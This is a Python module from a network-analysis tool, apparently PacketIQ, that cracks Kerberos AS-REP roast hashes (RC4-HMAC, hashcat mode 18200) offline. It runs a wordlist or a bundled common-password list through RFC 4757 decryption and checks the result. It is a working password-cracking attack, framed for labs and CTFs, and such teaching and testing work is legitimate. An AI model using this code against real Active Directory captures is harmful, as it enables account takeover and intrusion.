"""
Cracking an AS-REP roast.

PacketIQ already extracts the AS-REP for an account with pre-authentication
disabled, formatted as a hashcat `-m 18200` string. This takes that string and a
wordlist and recovers the password the way hashcat would, so the whole chain
(enumerate the account, capture the roast, recover the password) can be shown end
to end. Only RC4-HMAC (etype 23) is cracked here, which is what the roast in a
Directory-style capture uses; AES roasts are left to hashcat.
"""

from __future__ import annotations

from collections.abc import Iterable, Iterator
from pathlib import Path

from packetiq.offline.crypto import hmac_md5, nt_hash, rc4

# Key usage for the AS-REP encrypted part under RC4-HMAC (RFC 4757 maps Kerberos
# usage 3 to the export value 8).
_AS_REP_USAGE = (8).to_bytes(4, "little")
_PREFIX = "$krb5asrep$23$"


def parse_asrep_hash(hash_string: str) -> tuple[str, bytes, bytes] | None:
    """Split a `$krb5asrep$23$user@REALM:checksum$edata` string into its parts.

    Returns (principal, checksum, edata) or None when it is not an RC4 roast.
    """
    text = hash_string.strip()
    if not text.startswith(_PREFIX):
        return None
    body = text[len(_PREFIX):]
    principal_checksum, _, edata_hex = body.partition("$")
    principal, sep, checksum_hex = principal_checksum.partition(":")
    if not sep or not edata_hex:
        return None
    try:
        return principal, bytes.fromhex(checksum_hex), bytes.fromhex(edata_hex)
    except ValueError:
        return None


def verify_password(checksum: bytes, edata: bytes, password: str) -> bytes | None:
    """Return the decrypted enc-part if `password` is correct, else None.

    This is the RC4-HMAC decrypt (RFC 4757): derive K1 from the NT hash and the
    key usage, K3 from K1 and the checksum, RC4-decrypt, and accept only when the
    recomputed HMAC matches the checksum that shipped with the ticket.
    """
    k1 = hmac_md5(nt_hash(password), _AS_REP_USAGE)
    k3 = hmac_md5(k1, checksum)
    plaintext = rc4(k3, edata)
    return plaintext if hmac_md5(k1, plaintext) == checksum else None


def crack(hash_string: str, passwords: Iterable[str]) -> str | None:
    """Try each password against the AS-REP roast; return the first that works."""
    parsed = parse_asrep_hash(hash_string)
    if parsed is None:
        return None
    _principal, checksum, edata = parsed
    for password in passwords:
        if verify_password(checksum, edata, password) is not None:
            return password
    return None


def iter_wordlist(path: str | Path) -> Iterator[str]:
    """Stream a wordlist file, one candidate per line, tolerant of encoding."""
    with open(path, encoding="utf-8", errors="replace") as fh:
        for line in fh:
            word = line.rstrip("\r\n")
            if word:
                yield word


_BUNDLED = Path(__file__).parent / "common_passwords.txt"


def bundled_wordlist() -> Iterator[str]:
    """A small list of genuinely common weak passwords, used when the user gives
    no wordlist. It is not room-specific; it is the sort of list any cracker
    ships, and it is enough for the weak passwords a lab or CTF account uses."""
    if _BUNDLED.is_file():
        yield from iter_wordlist(_BUNDLED)
